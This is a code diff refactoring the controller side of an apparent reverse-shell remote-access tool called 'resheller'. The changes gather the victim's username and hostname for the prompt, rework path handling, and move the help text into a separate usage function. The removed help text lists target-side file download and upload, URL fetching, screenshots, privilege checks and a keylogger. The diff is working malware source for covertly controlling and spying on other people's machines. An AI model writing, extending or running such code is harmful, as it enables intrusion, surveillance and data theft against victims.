@@ -6,6 +6,7 @@ from time import strftime
 
 from src.pipe.safe_socket import SafeSocket
 from src.stdout.color import Color
+from src.stdout.output import usage
 
 
 class Shell:
@@ -18,11 +19,20 @@ class Shell:
         self.time = strftime("%H.%M.%S")
         self.safe_sock = SafeSocket(self.target)
         self.windows = self.safe_sock.callback("get_os")
+        self.usr = self.get_username()
+        self.host = self.safe_sock.callback("hostname")[:-2]
+
+    def get_username(self):
+        usr = self.safe_sock.callback("whoami")
+        if self.windows:
+            return usr.split("\\")[1][:-2]
+        return usr
 
     @staticmethod
     def make_dir(command):
+        home = str(Path.home())
         date = strftime("%Y.%m.%d")
-        main_dir = path.join(str(Path.home()), ".resheller")
+        main_dir = path.join(home, ".resheller")
         _dir = path.join(main_dir, date, command)
         if not path.isdir(_dir):
             Path(_dir).mkdir(parents=True, exist_ok=True)
@@ -41,6 +51,7 @@ class Shell:
             print(Color(f"Saved {log_file}\n").grn())
 
     def download(self, command):
+        # TODO - fix loop
         count = 1
         _dir = self.make_dir("downloads")
         downloaded = path.join(_dir, f"{command[9:]}")
@@ -70,13 +81,17 @@ class Shell:
 
     def print_stdout(self):
         stdout = self.safe_sock.recv()
-        if stdout[:3] == "[+]" and len(stdout) > 3:
-            stdout = Color(f"{stdout}\n").b_grn()
-        elif stdout == '[+]':
-            return
+        if stdout[:3] == "[+]":
+            if len(stdout) > 3:
+                stdout = Color(f"{stdout}\n").b_grn()
+            else:
+                return
         elif stdout[:3] == "[!]":
             stdout = Color(f"{stdout}\n").b_red()
+        elif stdout[:3] == "[*]":
+            stdout = Color(f"{stdout}\n").ylw()
         print(stdout)
+        return
 
     def independent_path(self, *args):
         if self.windows:
@@ -84,63 +99,44 @@ class Shell:
         else:
             return path.join(*args)
 
+    def resolve_path(self, root, del_, dirs):
+        path_ = "~"
+        if len(dirs) == 1:
+            return dirs[0]
+        if len(dirs) == 2:
+            if root:
+                return path_ + dirs[0]
+            return dirs[0] + dirs[1]
+        if len(dirs) == 3:
+            if root:
+                return self.independent_path(path_, dirs[2])
+            return f"{path_}{dirs[0]}"
+        if len(dirs) > 3:
+            base = dirs.pop(-1)
+            del dirs[0:del_]
+            for _ in dirs:
+                path_ = self.independent_path(path_, "..")
+            return self.independent_path(path_, base)
+
     def get_path(self):
-        root = False
-        request = "pwd"
-        slash = "/"
-        del_list = 3
-        chop = 1
         if self.windows:
-            request = "cd"
-            slash = "\\"
-            chop = 2
-        stdout = self.safe_sock.callback(request)
-        dir_list = stdout.split(slash)
-        dir_list[-1] = dir_list[-1][:-chop]
-        if dir_list[1] == "root":
-            root = True
-            del_list = 2
-        dir_list[0] = slash
-        if len(dir_list) == 1:
-            return dir_list[0]
-        if len(dir_list) == 2:
-            if root:
-                return f"~{dir_list[0]}"
-            return f"{dir_list[0]}{dir_list[1]}"
-        if len(dir_list) == 3:
-            if root:
-                return self.independent_path("~", dir_list[2])
-            return f"~{dir_list[0]}"
-        if len(dir_list) > 3:
-            basename = dir_list.pop(-1)
-            del dir_list[0:del_list]
-            simplified = "~"
-            count = 0
-            while count < len(dir_list):
-                simplified = self.independent_path(simplified, "..")
-                count += 1
-            return self.independent_path(simplified, basename)
+            req, sep, chop = "cd", "\\", 2
+        else:
+            req, sep, chop = "pwd", "/", 1
+        stdout = self.safe_sock.callback(req)
+        dirs = stdout.split(sep)
+        dirs[-1] = dirs[-1][:-chop]
+        dirs[0] = sep
+        if dirs[1] == "root":
+            root, del_ = True, 2
+        else:
+            root, del_ = False, 3
+        return self.resolve_path(root, del_, dirs)
 
     def ps1(self):
-        return input(f'{Color("{").b_blu()}{Color("shell").b_red()}'
-                     f'{Color("@").b_blu()}{Color(self.ip).b_red()}:'
+        return input(f'{Color("{").b_blu()}{Color(self.usr).b_red()}'
+                     f'{Color("@").b_blu()}{Color(self.host).b_red()}:'
                      f'{Color(self.get_path()).b_grn()}{Color("}>").b_blu()} ')
-
-    @staticmethod
-    def help():
-        help_options = (
-            "[*] Usage:\n"
-            "help            --> print this help message\n"
-            "download <path> --> download file from target\n"
-            "upload <path>   --> upload file from target\n"
-            "get <url>       --> download file from website to target\n"
-            "screenshot      --> take screenshot on target\n"
-            "check           --> check for admin privileges\n"
-            "keylogger <opt> --> <start> --> start keylogger on target\n"
-            "                    <dump>  --> retrieve logs from target\n"
-            "quit            --> exit reverse shell\n"
-        )
-        print(Color(help_options).ylw())
 
     def exit_shell(self):
         self.target.close()
@@ -152,7 +148,7 @@ class Shell:
         while True:
             command = self.ps1()
             if command == "help":
-                self.help()
+                print(Color(usage()).ylw())
                 continue
             if command == "ls":
                 command = "dir"
